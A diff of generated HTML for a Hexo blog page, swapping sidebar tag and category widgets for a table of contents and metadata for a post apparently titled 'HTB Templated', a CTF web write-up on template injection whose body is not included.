-            ><div class='name'>ERA 计算机体系结构</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" href="/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"
-            active-action="action-categoriesTUME8AFBEE7A88BE7AC94E8AEB0GBS-E6938DE4BD9CE7B3BBE7BB9F"
-            ><div class='name'>GBS 操作系统</div><div class='badge'>(4)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E7%BC%96%E7%A8%8B/" href="/categories/%E7%BC%96%E7%A8%8B/"
-            active-action="action-categoriesE7BC96E7A88B"
-            ><div class='name'>编程</div><div class='badge'>(1)</div></a></li>
-        
-      </ul>
-    </div>
-  </section>
-
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget tagcloud desktop mobile">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fa-solid fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/ACM/" style="font-size: 24px; color: #555">ACM</a> <a href="/tags/Betriebssysteme/" style="font-size: 21.5px; color: #666">Betriebssysteme</a> <a href="/tags/C/" style="font-size: 14px; color: #999">C++</a> <a href="/tags/CTF/" style="font-size: 14px; color: #999">CTF</a> <a href="/tags/Database/" style="font-size: 14px; color: #999">Database</a> <a href="/tags/Datenbank/" style="font-size: 14px; color: #999">Datenbank</a> <a href="/tags/HTB/" style="font-size: 21.5px; color: #666">HTB</a> <a href="/tags/Injection/" style="font-size: 16.5px; color: #888">Injection</a> <a href="/tags/Jinja2/" style="font-size: 14px; color: #999">Jinja2</a> <a href="/tags/Mako/" style="font-size: 14px; color: #999">Mako</a> <a href="/tags/Operating-System/" style="font-size: 21.5px; color: #666">Operating System</a> <a href="/tags/RISC-V/" style="font-size: 14px; color: #999">RISC-V</a> <a href="/tags/Rechnerarchitektur/" style="font-size: 16.5px; color: #888">Rechnerarchitektur</a> <a href="/tags/Reverse-Engineering/" style="font-size: 16.5px; color: #888">Reverse Engineering</a> <a href="/tags/SQL/" style="font-size: 14px; color: #999">SQL</a> <a href="/tags/Template-Injection/" style="font-size: 16.5px; color: #888">Template Injection</a> <a href="/tags/Web/" style="font-size: 16.5px; color: #888">Web</a> <a href="/tags/container/" style="font-size: 14px; color: #999">container</a> <a href="/tags/cpp/" style="font-size: 14px; color: #999">cpp</a> <a href="/tags/remote/" style="font-size: 14px; color: #999">remote</a> <a href="/tags/socket/" style="font-size: 14px; color: #999">socket</a> <a href="/tags/writeup/" style="font-size: 19px; color: #777">writeup</a> <a href="/tags/%E5%93%88%E5%B8%8C/" style="font-size: 14px; color: #999">哈希</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 21.5px; color: #666">操作系统</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 14px; color: #999">数据库</a> <a href="/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/" style="font-size: 14px; color: #999">文件系统</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 16.5px; color: #888">模板注入</a> <a href="/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/" style="font-size: 14px; color: #999">汇编语言</a> <a href="/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/" style="font-size: 14px; color: #999">虚拟化</a> <a href="/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/" style="font-size: 14px; color: #999">虚拟机</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/" style="font-size: 16.5px; color: #888">计算机体系结构</a> <a href="/tags/%E8%BE%93%E5%85%A5-%E8%BE%93%E5%87%BA/" style="font-size: 14px; color: #999">输入/输出</a>
-    </div>
-  </section>
-
-
-    
-  
-
   
 
 
 <div class="widget-sticky">
+
+  
+  
+
+
+<section class="widget toc-wrapper desktop mobile" id="toc-div" >
+  
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+  <div class='content'>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%82%E5%AF%9F"><span class="toc-text">观察</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D"><span class="toc-text">第一种</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D"><span class="toc-text">第二种</span></a></li></ol></li></ol>
+  </div>
+</section>
+
+  
 
 </div>
 
@@ -2962,6 +2947,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   <!-- Custom Files side end -->
 </aside>
+
 
 
         </div>
@@ -3510,7 +3496,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"hi"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/ERA 计算机体系结构/","name":"ERA 计算机体系结构"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"hi","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"hi"},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","description":"hi","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"hi"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/CTF/","name":"CTF"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/CTF/Web/","name":"Web"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/03/27/CTF/Web/HTB-Templated/","name":"HTB Templated"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"hi","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"hi"},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","headline":"HTB Templated","description":"hi","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/03/27/CTF/Web/HTB-Templated/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/03/27/CTF/Web/HTB-Templated/","wordCount":0,"datePublished":"2025-03-27T20:02:53.000Z","dateModified":"2025-03-27T20:55:06.020Z","articleSection":"CTF","keywords":"HTB,Web,Injection,Template Injection,模板注入,Jinja2","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
